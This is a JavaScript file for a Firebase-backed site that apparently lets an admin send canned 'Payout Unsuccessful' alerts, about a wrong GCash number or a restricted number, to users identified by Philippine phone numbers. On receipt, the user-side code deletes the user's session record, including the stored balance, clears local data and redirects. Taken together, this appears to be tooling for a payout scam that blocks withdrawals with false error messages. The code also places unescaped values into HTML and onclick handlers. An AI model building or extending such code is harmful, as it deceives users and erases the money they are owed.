/**
 * ADCOM.JS - Admin to User Chat (with separate command path)
 */

// ========== DETECT CURRENT PAGE ==========
const isAdminPage = window.location.pathname.includes('admin') || 
                    window.location.pathname.includes('admin_12820') ||
                    document.querySelector('.cia-header') !== null;

// ========== CSS PARA SA ADMIN POPUP ==========
if (isAdminPage) {
    const style = document.createElement('style');
    style.textContent = `
        .admin-command-popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 9999999;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .admin-command-popup-content {
            width: 90%;
            max-width: 400px;
            background: #1a1a2e;
            border-radius: 16px;
            border: 2px solid #00f2ff;
            overflow: hidden;
        }
        .admin-command-popup-header {
            padding: 15px;
            background: rgba(0,242,255,0.1);
            border-bottom: 1px solid #00f2ff;
            display: flex;
            justify-content: space-between;
        }
        .admin-command-popup-header h3 { color: #00f2ff; margin: 0; font-size: 14px; }
        .close-popup { background: none; border: none; color: #fff; font-size: 20px; cursor: pointer; }
        .user-info-section { padding: 15px; }
        .info-row { margin-bottom: 8px; font-size: 12px; }
        .info-label { color: #888; display: inline-block; width: 100px; }
        .info-value { color: #fff; }
        .command-buttons-section { padding: 15px; border-top: 1px solid #333; }
        .command-buttons-grid { display: flex; gap: 10px; }
        .command-btn { flex: 1; padding: 12px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
        .command-1 { background: #ff9800; color: #fff; }
        .command-2 { background: #2196f3; color: #fff; }
        .clickable-phone { cursor: pointer; color: #00f2ff; text-decoration: underline; }
    `;
    document.head.appendChild(style);
}

// ========== ADMIN: SHOW USER POPUP ==========
async function showUserDetailsPopup(phone) {
    if (!isAdminPage) return;
    
    const userSnap = await db.ref('user_sessions/' + phone).once('value');
    const userData = userSnap.val();
    
    if (!userData) {
        alert('User not found');
        return;
    }
    
    const balance = (userData.balance || 0).toFixed(2);
    const device = userData.deviceFingerprint || 'Unknown';
    
    const popupHTML = `
        <div id="userCommandPopup" class="admin-command-popup">
            <div class="admin-command-popup-content">
                <div class="admin-command-popup-header">
                    <h3>👤 SEND MESSAGE</h3>
                    <button class="close-popup" onclick="closeUserCommandPopup()">✕</button>
                </div>
                <div class="user-info-section">
                    <div class="info-row"><span class="info-label">📱 Number:</span><span class="info-value">${phone}</span></div>
                    <div class="info-row"><span class="info-label">💰 Balance:</span><span class="info-value">₱${balance}</span></div>
                    <div class="info-row"><span class="info-label">🔑 Device:</span><span class="info-value">${device.substring(0,20)}...</span></div>
                </div>
                <div class="command-buttons-section">
                    <div class="command-buttons-grid">
                        <button class="command-btn command-1" onclick="sendCommand('${phone}', '1')">📧 WRONG NUMBER</button>
                        <button class="command-btn command-2" onclick="sendCommand('${phone}', '2')">📞 RESTRICTED</button>
                    </div>
                </div>
            </div>
        </div>
    `;
    
    const existing = document.getElementById('userCommandPopup');
    if (existing) existing.remove();
    document.body.insertAdjacentHTML('beforeend', popupHTML);
}

function closeUserCommandPopup() {
    const popup = document.getElementById('userCommandPopup');
    if (popup) popup.remove();
}

// ========== ADMIN: SEND COMMAND SA SEPARATE PATH ==========
async function sendCommand(phone, type) {
    if (!isAdminPage) return;
    
    closeUserCommandPopup();
    
    let message = '';
    if (type === '1') {
        message = '⚠️ Payout Unsuccessful! Please use your registered GCash number.';
    } else {
        message = '⚠️ Payout Unsuccessful! Your number is restricted. Use another registered number.';
    }
    
    // Gumamit ng SEPARATE PATH: user_commands/{phone}
    await db.ref('user_commands/' + phone).set({
        message: message,
        type: type,
        timestamp: Date.now()
    });
}

// ========== ADMIN: MAKE PHONES CLICKABLE ==========
function makePhonesClickable() {
    if (!isAdminPage) return;
    
    document.querySelectorAll('#ghostData td').forEach(cell => {
        const text = cell.innerText.trim();
        if (text.match(/^\+63\d{10}$/) || text.match(/^09\d{9}$/)) {
            if (!cell.hasAttribute('data-clickable')) {
                cell.setAttribute('data-clickable', 'true');
                cell.style.cursor = 'pointer';
                cell.style.color = '#00f2ff';
                cell.style.textDecoration = 'underline';
                cell.addEventListener('click', () => {
                    showUserDetailsPopup(text);
                });
            }
        }
    });
}

function observeTableChanges() {
    if (!isAdminPage) return;
    const observer = new MutationObserver(() => makePhonesClickable());
    const target = document.getElementById('ghostData');
    if (target) observer.observe(target, { childList: true, subtree: true });
    makePhonesClickable();
}

// ========== USER: LISTEN SA SEPARATE PATH ==========
function listenForCommands() {
    const userPhone = localStorage.getItem('userPhone');
    if (!userPhone) return;
    
    // Nakikinig LANG sa user_commands/{phone} - HINDI sa user_sessions
    const commandRef = db.ref('user_commands/' + userPhone);
    
    commandRef.on('value', (snapshot) => {
        const command = snapshot.val();
        
        // KUNG MAY COMMAND
        if (command) {
            // MAG-ALERT KAY USER
            alert(command.message);
            
            // DELETE COMMAND PARA HINDI MAULIT
            db.ref('user_commands/' + userPhone).remove();
            
            // CLEAR DATA AT REDIRECT
            localStorage.removeItem('userPhone');
            localStorage.removeItem('userDeviceId');
            localStorage.removeItem('userSession');
            
            // I-DELETE ANG USER SESSION
            db.ref('user_sessions/' + userPhone).remove();
            
            // REDIRECT
            window.location.href = 'index.html';
        }
    });
}

// ========== START ==========
function init() {
    if (isAdminPage) {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => setTimeout(observeTableChanges, 1000));
        } else {
            setTimeout(observeTableChanges, 1000);
        }
    } else {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => setTimeout(listenForCommands, 1000));
        } else {
            setTimeout(listenForCommands, 1000);
        }
    }
}

init();
